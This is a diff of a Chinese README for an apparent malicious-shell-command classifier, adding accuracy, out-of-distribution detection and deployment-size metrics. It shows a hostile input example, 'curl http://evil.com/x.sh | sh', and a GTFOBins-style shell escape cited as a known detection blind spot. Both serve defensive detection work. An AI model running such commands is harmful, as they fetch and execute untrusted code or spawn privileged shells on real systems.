@@ -44,11 +44,39 @@ hyperids 'curl http://evil.com/x.sh | sh'
 
 详见 `deploy/c_runtime/README.md` 与 `docs/TRAINING.md`。
 
-## 模型指标（test 5,978）
+## 模型指标
 
-| 指标 | fp32 | INT8 |
+### 内测（test 5,978）
+
+| 指标 | fp32 | INT8（部署） |
 |---|---|---|
-| verdict_acc | 0.917 | 0.919 |
-| action micro-F1 | 0.909 | 0.910 |
+| verdict_acc | 0.9167 | **0.9187** |
+| action micro-F1 | 0.9090 | **0.9099** |
+| action precision | 0.9351 | 0.9338 |
+| action recall | 0.8843 | 0.8871 |
+
+> INT8 与 fp32 基本无损。
+
+### 外部公开语料（OOD，冻结评测集 27,995 条）
+
+| 指标 | 值 |
+|---|---|
+| 良性端恶意误报率（NL2Bash 10,623 条） | **0.05%** |
+| 明确恶意 vs 良性 ROC-AUC | **0.9704** |
+| 明确恶意 vs 良性 PR-AUC | 0.7603 |
+| 反弹 shell / 下载执行 / C2 子集恶意召回 | 75.9%（非良性 90.4%） |
+
+> 已知盲区：GTFOBins 风格 SUID 提权逃逸（`R -e 'system("/bin/sh")'`）召回偏低，
+> 详见 `docs/EXTERNAL_EVAL.md`。
+
+### 部署规格
+
+| 项 | 值 |
+|---|---|
+| 参数量 | 29.8M（≤30M） |
+| INT8 ONNX 体积 | 30.2MB |
+| C 单二进制（per-channel int8） | ~31MB |
+| C 运行时峰值 RSS | ~38 MiB（<100MB） |
+| 推理速度 | ~266 ms/条（AVX2+FMA，CPU） |
 
 完整模型卡见 `docs/MODEL_CARD.md`。
